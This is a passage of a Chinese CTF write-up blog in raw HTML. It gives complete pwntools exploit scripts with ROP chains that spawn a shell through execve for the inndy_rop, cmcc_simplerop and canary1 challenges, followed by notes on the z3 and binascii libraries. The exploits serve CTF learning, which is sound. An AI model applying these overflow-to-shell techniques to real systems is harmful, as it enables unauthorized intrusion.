定义一个函数,将生成的shellcode直接粘贴进去,加上b&#x27;a&#x27; * (0xc + 4)的偏移即可</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shellcode</span>():</span><br><span class="line">    p = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xc</span> + <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>)  <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>)  <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>)  <span class="comment"># @ .data + 4</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>)  <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>)  <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>)  <span class="comment"># pop ebx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>)  <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>)  <span class="comment"># pop ecx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>)  <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>)  <span class="comment"># int 0x80</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = shellcode()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行没有问题:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230812234652868.png" alt="image-20230812234652868"></p><p>然后我想自己构造(具体知识见百度[ctf rop]…):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop_eax_ret_addr = <span class="number">0x080b8016</span></span><br><span class="line">pop_edx_ecx_ebx_ret_addr = <span class="number">0x0806ed00</span></span><br><span class="line">sh_addr = <span class="number">0x080be47d</span></span><br><span class="line">int_0x80_addr = <span class="number">0x0806c943</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xc</span>+<span class="number">4</span>) + p32(pop_eax_ret_addr) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx_ret_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) +p32(sh_addr)+p32(int_0x80_addr)</span><br></pre></td></tr></table></figure><p>但是sh_addr不行,因为sys_execve()要使用’/bin/bash’,所以这里应该手动注入:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230812235420260.png" alt="image-20230812235420260" style="zoom:50%;" /><p>截图取自https://blog.csdn.net/qq_73149934/article/details/128430238</p><p>这里先放个记录,回头再看看</p><h2 id="cmcc-simplerop">cmcc_simplerop</h2><p>这个题也是rop,不过用ROPgadget生成的shellcode跑不通,手动写的syscall可以过</p><p>checksec发现没有PIE,开了NX</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813120940170.png" alt="image-20230813120940170" style="zoom:45%;" /><p>题目很简单,就是直接让read溢出,这里的思路是用系统调用11来用execve进行getshell</p><p>先计算个偏移(IDA里直接看的有误):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813125157314.png" alt="image-20230813125157314"></p><p>生成一串数字复制下来然后调试:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813125237078.png" alt="image-20230813125237078"></p><p>输入那串字符:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813125253822.png" alt="image-20230813125253822"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813125318034.png" alt="image-20230813125318034"></p><p>这里提示了一个无效地址,然后再运行这个命令:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813125359575.png" alt="image-20230813125359575"></p><p>找到偏移32(即0x20)</p><p>接下来分析rop,用ROPgadget发现没有’/bin/sh\x00’这个字符串,所幸有read函数,那么首先要用栈溢出将返回地址返回到read函数来将其注入到.bss段(这道题没有开启PIE，bss的地址就是绝对地址)</p><p>如此有第一段payload如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ret to read() --- read &#x27;/bin/sh&#x27;</span></span><br><span class="line">read_addr = <span class="number">0x0806CD50</span></span><br><span class="line"><span class="comment"># bin_sh_addr 为从.bss段中找的足够长的一段内存</span></span><br><span class="line">bin_sh_addr = <span class="number">0x080EAFBF</span></span><br><span class="line"><span class="comment">#最后的0x8为接下来要输入的&#x27;/bin/sh\x00&#x27;字符串的长度</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>) + p32(read_addr) + p32(pop_edx_ecx_ebx_ret_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr) + p32(<span class="number">0x8</span>)</span><br></pre></td></tr></table></figure><p>再接下来就是系统调用,知识见inndy_rop的WP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># syscall --- execve</span></span><br><span class="line">payload += p32(pop_eax_ret_addr) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx_ret_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh_addr) + p32(int_0x80_addr)</span><br></pre></td></tr></table></figure><p>最后记得要多加一个字符串的输入:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最后总的代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26428</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./rop&#x27;)</span></span><br><span class="line"></span><br><span class="line">pop_eax_ret_addr = <span class="number">0x080bae06</span></span><br><span class="line">pop_edx_ecx_ebx_ret_addr = <span class="number">0x0806e850</span></span><br><span class="line">sh_addr = <span class="number">0x080c1a9d</span></span><br><span class="line">int_0x80_addr = <span class="number">0x080493e1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ret to read() --- read &#x27;/bin/sh&#x27;</span></span><br><span class="line">read_addr = <span class="number">0x0806CD50</span></span><br><span class="line"><span class="comment"># bin_sh_addr 为从.bss段中找的足够长的一段内存</span></span><br><span class="line">bin_sh_addr = <span class="number">0x080EAFBF</span></span><br><span class="line"><span class="comment"># 最后的0x8为接下来要输入的&#x27;/bin/sh\x00&#x27;字符串的长度</span></span><br><span class="line"><span class="comment"># 0x20的偏移需要使用调试去动态检查出来(cyclic -l 0x61616169)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>) + p32(read_addr) + p32(pop_edx_ecx_ebx_ret_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr) + p32(<span class="number">0x8</span>)</span><br><span class="line"><span class="comment"># syscall --- execve</span></span><br><span class="line">payload += p32(pop_eax_ret_addr) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx_ret_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh_addr) + p32(int_0x80_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面的是失败的ropchain(ROPgadget生成的)</span></span><br><span class="line"><span class="comment"># def shellcode():</span></span><br><span class="line"><span class="comment">#     p = b&#x27;a&#x27; * 0x20</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0806e82a)  # pop edx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea060)  # @ .data</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080bae06)  # pop eax ; ret</span></span><br><span class="line"><span class="comment">#     p += b&#x27;/bin&#x27;</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0809a15d)  # mov dword ptr [edx], eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0806e82a)  # pop edx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea064)  # @ .data + 4</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080bae06)  # pop eax ; ret</span></span><br><span class="line"><span class="comment">#     p += b&#x27;//sh&#x27;</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0809a15d)  # mov dword ptr [edx], eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0806e82a)  # pop edx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea068)  # @ .data + 8</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x08054250)  # xor eax, eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0809a15d)  # mov dword ptr [edx], eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080481c9)  # pop ebx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea060)  # @ .data</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0806e851)  # pop ecx ; pop ebx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea068)  # @ .data + 8</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea060)  # padding without overwrite ebx</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0806e82a)  # pop edx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea068)  # @ .data + 8</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x08054250)  # xor eax, eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080493e1)  # int 0x80</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     return p</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = shellcode()</span></span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813121936742.png" alt="image-20230813121936742" style="zoom:45%;" /><p>结束…</p><h2 id="canary1">canary1</h2><p>关于canary…百度复习吧…</p><p>绕过方法:</p><p>​1.大量fork的题: 使用逐字节爆破的方法</p><p>​2.字符串输出泄露canary</p><p>​3.GOT表劫持</p><p>但是…这道题是假的canary!!!</p><p>虽然checksec显示有canary…但是…</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813223357926.png" alt="image-20230813223357926" style="zoom:50%;" /><p>看汇编也能看出来,xor的结果根本就没有用到,下面是无条件跳转到call之后:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813223656235.png" alt="image-20230813223656235" style="zoom:50%;" /><p>而且实际编写脚本也能发现0x20的输入长度根本不足以溢出到覆盖所谓canary的开头的00字节:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813223739191.png" alt="image-20230813223739191" style="zoom:50%;" /><p>所以实际上就是个常规溢出,这里是syscall的getshell方式,而且题目中已经存在’/bin/sh’了…</p><p>本来这个题原本是用字符串溢出来泄露canary的…但是被某大佬patch掉了…orz</p><p>代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&#x27;node4.buuoj.cn&#x27;, 26428)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./canary1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># syscall</span></span><br><span class="line">string = <span class="string">&#x27;what do you want to say:\n&#x27;</span></span><br><span class="line">paddings = <span class="number">0x28</span></span><br><span class="line">bin_sh_addr = <span class="number">0x000000006b90f0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这里注意64位传参的前三个参数依次为rdi,rsi,rdx</span></span><br><span class="line">pop_rax_ret_addr = <span class="number">0x00000000004005af</span></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x00000000004006a6</span></span><br><span class="line">pop_rsi_ret_addr = <span class="number">0x0000000000410183</span></span><br><span class="line">pop_rdx_ret_addr = <span class="number">0x000000000044b5c6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 要使用syscall而不是x86的int_0x80</span></span><br><span class="line"><span class="comment"># 使用ROPgadget --binary canary1 --only syscall查找得到</span></span><br><span class="line"><span class="comment"># int_0x80_addr = 0x0000000000417f2f</span></span><br><span class="line">syscall_addr = <span class="number">0x00000000004012fc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意此题为64位，系统调用和32位不同，所以不能使用11的方法，这里使用0x3b(59)</span></span><br><span class="line"><span class="comment"># 其他的基本一致</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * paddings + p64(pop_rax_ret_addr) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(pop_rsi_ret_addr) + p64(<span class="number">0</span>) + p64(pop_rdx_ret_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;How to bypass canary:  \n&quot;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(string, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813223307551.png" alt="image-20230813223307551"></p><p>结束…</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> PWN </tag>
            
            <tag> NX </tag>
            
            <tag> mprotect </tag>
            
            <tag> rop </tag>
            
            <tag> syscall </tag>
            
            <tag> canary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用算法库</title>
      <link href="/2023-08-03-e1a64ca7ff81/"/>
      <url>/2023-08-03-e1a64ca7ff81/</url>
      
        <content type="html"><![CDATA[<h1 id="python">Python</h1><h2 id="ida-python">IDA Python</h2><p>顾名思义,在IDA中写python脚本,用来提取数据等</p><p>用到idc_bc695这个库</p><p>另见:</p><p>​<a href="https://blog.csdn.net/m0_52164435/article/details/124878537">https://blog.csdn.net/m0_52164435/article/details/124878537</a></p><h2 id="数学库">数学库</h2><h3 id="z3库">z3库</h3><h4 id="安装">安装</h4><p>需要使用python3(python2已不再受支持,安装很可能出现问题)来安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install z3</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上面命令失败的话可以尝试</span></span><br><span class="line">pip install z3-solver</span><br></pre></td></tr></table></figure><h4 id="声明求解范围">声明求解范围</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Int()和Ints()函数用于申请整数解</span></span><br><span class="line">a = Int(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">a,b = Ints(<span class="string">&#x27;a b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有理数解</span></span><br><span class="line">a = Real(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">a, b = Reals(<span class="string">&quot;a b&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 位向量，用于求解与/或/移位等位运算</span></span><br><span class="line"><span class="comment"># 第二个参数表示位数</span></span><br><span class="line">a = BitVec(<span class="string">&quot;a&quot;</span>, <span class="number">8</span>)</span><br><span class="line">a, b = BitVecs(<span class="string">&quot;a b&quot;</span>, <span class="number">8</span>)</span><br></pre></td></tr></table></figure><h4 id="增加方程约束">增加方程约束</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#建立求解器</span></span><br><span class="line">S=Solver()</span><br><span class="line"><span class="comment">#添加约束</span></span><br><span class="line">equs=[</span><br><span class="line">    a+b==<span class="number">10</span>,</span><br><span class="line">    a-b==<span class="number">6</span></span><br><span class="line">]</span><br><span class="line">S.add(equs)</span><br><span class="line"><span class="comment">#也可以一个一个加</span></span><br><span class="line">S.add(a+b==<span class="number">10</span>)</span><br></pre></td></tr></table></figure><h4 id="求解">求解</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(s.check())   <span class="comment"># sat代表有解，unsat代表无解</span></span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure><h2 id="数据处理库">数据处理库</h2><h3 id="二进制-字符处理-binascii">二进制-字符处理—binascii</h3><p>参阅https://blog.csdn.net/asmartkiller/article/details/114704320</p><p>主要用于二进制和ASCII互相转换</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230922171158471.png" alt="image-20230922171158471"></p><p>转为二进制数据bin_var后,如果进一步转为字符串,那么进行<code>bin_var.decode()</code>即可</p><p>例如<code>（SUCTF2019）SignIn</code>中使用<code>binascii.unhexlify()</code>方法将生成的十六进制字符串转为字符串</p><h4 id="例题">例题</h4><p>见[<a href="https://www.ctfer.vip/problem/403">SWPUCTF 2021 新生赛]简简单单的逻辑</a></p><p>使用int.from_bytes()方法进行字节流转为int的操作,同时需要指定大小端序</p><p>解密脚本:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;xxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">47</span>, <span class="number">138</span>, <span class="number">127</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">143</span>, <span class="number">17</span>, <span class="number">84</span>, <span class="number">42</span>, <span class="number">135</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">28</span>, <span class="number">169</span>, <span class="number">25</span>]</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># for i in range(len(list)):</span></span><br><span class="line"><span class="comment">#     key = (list[i]&gt;&gt;4)+((list[i] &amp; 0xf)&lt;&lt;4)</span></span><br><span class="line"><span class="comment">#     result += str(hex(ord(flag[i])^key))[2:].zfill(2)</span></span><br><span class="line"><span class="comment"># print(result)</span></span><br><span class="line"><span class="comment"># result=bcfba4d0038d48bd4b00f82796d393dfec</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(len(list)):</span></span><br><span class="line"><span class="comment">#     list[i] = (list[i] &gt;&gt; 4) + ((list[i] &amp; 0xf) &lt;&lt; 4)</span></span><br><span class="line"><span class="comment"># print(list)</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">242</span>, <span class="number">168</span>, <span class="number">247</span>, <span class="number">147</span>, <span class="number">87</span>, <span class="number">203</span>, <span class="number">51</span>, <span class="number">248</span>, <span class="number">17</span>, <span class="number">69</span>, <span class="number">162</span>, <span class="number">120</span>, <span class="number">196</span>, <span class="number">150</span>, <span class="number">193</span>, <span class="number">154</span>, <span class="number">145</span>]</span><br><span class="line">result = <span 